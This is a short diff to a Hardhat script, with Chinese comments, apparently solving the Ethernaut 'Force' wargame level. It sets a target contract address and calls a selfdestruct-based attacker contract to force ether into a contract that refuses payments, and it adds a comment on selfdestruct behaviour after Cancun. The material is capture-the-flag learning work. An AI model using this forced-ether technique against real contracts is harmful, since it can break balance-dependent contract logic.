@@ -13,10 +13,11 @@ async function main() {
   console.log("ForceAttacker 合約部署在: ", await attacker.getAddress());
 
   // 取得 Force 合約實例
-  const forceAddress = "YOUR_FORCE_CONTRACT_ADDRESS"; // 替換成你的 Force 合約地址
+  const forceAddress = "0x8c6D1B88372D83DABB454FBb19F31A267b01A463"; // 替換成你的 Force 合約地址
   console.log("目前 Force 合約地址的餘額: ", await hre.ethers.provider.getBalance(forceAddress));
   
   // 執行攻擊
+  // selfdestruct() 在 Cancun 升級後就被丟棄了，並不會刪除合約，但會將合約餘額轉移給指定地址
   const tx = await attacker.attack_bySelfdestruct(forceAddress);
   // 等待交易被確認
   await tx.wait();
